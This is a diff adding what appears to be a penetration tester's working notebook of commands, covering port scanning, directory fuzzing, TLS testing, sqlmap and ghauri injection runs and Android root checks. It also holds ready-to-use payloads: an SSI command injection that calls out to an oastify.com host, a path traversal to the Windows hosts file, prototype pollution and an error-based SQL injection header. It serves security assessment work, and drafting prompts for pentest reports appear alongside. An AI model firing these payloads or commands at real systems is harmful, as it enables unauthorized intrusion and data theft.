@@ -1,0 +1,108 @@
+0b7aec74
+1bnkP0C 
+NMAP Command :-
+set PATH=%PATH%;C:\Program Files (x86)\Nmap
+   yu
+nmap -sS -Pn -p- example --open --exclude-ports 2000,5060,8008,8010,8015,8020 --min-rate=10000
+nmap  -p- -Pn -iL nmap_host.txt --exclude-ports 2000,5060,8008,8010,8015,8020 --min-rate=1000 -vv --open -oA 
+
+Nmap_Full_port_scan_name
+Hi team, Use this nmap command to find versions and http title for open ports 
+nmap -sV -sS -p- -Pn -iL domain.txt -oA vikas -vv -T4 --max-hostgroup 10 --open -script http-title
+For live IP's
+nmap -Pn -n -vv --open -iL ip.txt |grep -i "report for" |cut -d " " -f 5
+ 
+We have already initiated the revalidation testing and will update you shortly.
+ffuf -u https://example/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+
+
+OpenSSL Command :-
+openssl s_client -connect domainname:port_number
+openssl s_client -connect example.com.ae:443
+
+
+RUBY Command :-
+ruby parse-burp.rb -i file_name.xml -o file_name.csv
+ 
+ 
+INSPECT COMMAND :-
+{jquery-javascript}
+console.log(jQuery().jquery);
+ 
+{bootStrap}
+jQuery.fn.tooltip.Constructor.VERSION
+ 
+curl --head https://example.com/
+
+
+curl -X PURGE https://example.com/
+angular.version
+$.fn.jquery
+ 
+Paramter Pollution
+jQuery.extend(true, {}, JSON.parse('{"__proto__": {"xxx": "polluted"}}'));
+console.log({}.xxx);
+ 
+command injection
+ 
+"-->'-->`--><!--#set var="pr6" value="oq59t5abkk"--><!--#set var="rt8" value="qs7bv7cdmm"--><!--#echo var="pr6"--><!--#echo var="rt8"--><!--#exec cmd="nslookup -q=cname 2orm5pr7fqbq3l54gkha51067xdo1gp5.oastify.com" -->
+
+ .%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./c:/windows/system32/drivers/etc/hosts
+
+const loadsh=_.VERSION.console.log(loadsh);
+ 
+%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22pr6%22%20value%3d%22oq59t5abkk%22--%3e%3c!--%23set%20var%3d%22rt8%22%20value%3d%22qs7bv7cdmm%22--%3e%3c!--%23echo%20var%3d%22pr6%22--%3e%3c!--%23echo%20var%3d%22rt8%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%202orm5pr7fqbq3l54gkha51067xdo1gp5.oastify.com%22%20--%3e
+ 
+testssl https://domain.com
+ 
+Lucky13 and Breach
+testssl -L -E https://domain.com
+
+sqlmap: sqlmap -r post.txt --level 5 --risk 3 --batch --banner --dbs
+
+
+gobuster dir --url "https://example.com/wp-json/oembed/1.0/embed" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /home/kali/Desktop/gobuster.txt
+
+
+help me write write-up for my penetration testing engagement.... you need to give a Vulnerability Name, Severity, Description (3-4 lines), Impact (3-4 lines), Remediation (4-5 points) It should be like a third person view. it should be short, simple, and clear. I'll provide you below scenarios and do it.Email Address Discolsure
+
+ 
+help me in writing conclusion for the Pentest report...... like Critical - 3 which contains ....then High - like this you do...and if need to cover more comprehensive then consider having 10 lines I'll give you vulnerability name, abstract and severity
+ 
+Reflected X-Forwarded-For Header
+The application reflects the X-Forwarded-For header value in the response without sanitization or filtering. This does not directly lead to exploitation but can be misused in certain scenarios, such as:Information Disclosure: Attackers can confirm that their injected IP address is processed and reflected, which could aid in reconnaissance,Potential for HTTP Response Splitting: If the reflection occurs in an unsanitized manner within HTTP headers, it could allow HTTP header injection attacks and Log Pollution: If backend services rely on this header for logging or analytics, attackers can inject misleading data into logs, potentially affecting monitoring and investigations.
+
+
+Upgrade Underscore.js to the latest stable version 1.13.7.
+
+
+sqlmap -u "http://example.com.com/vulnerable.php?id=1" --technique E --dump
+sqlmap -u "http://example.com/api/profile" --headers="User-Agent: PostmanRuntime/7.43.0' OR updatexml(1,concat(0x3a,database()),1) --" --technique=E --dbs
+sqlmap -u "http://exMPLE.COM/api/approval-flow/department/update" --data="param1=value1&param2=value2" --method=POST --dbs --batch
+
+sqlmap -u "http://example.com/api/approval-flow/department/update" --data="param1=value1&param2=value2" --method=POST --tamper=space2comment,between --dbs --batch
+
+ghauri -u "http://example.com/api/approval-flow/department/update"
+
+
+sqlmap -u "https://example.com/" --dbs --random-agent --tamper=space2comment
+
+sqlmap -u "http://example.com/" --dbs --level=1 --risk=1
+Redirecting to 
+
+Android notes
+how we can know that the device is rooted:
+adb shell
+su
+ls
+cd data/local/tmp
+ls
+./frida--- &
+
+
+
+
+
+sudo msfconsole
+search ftp
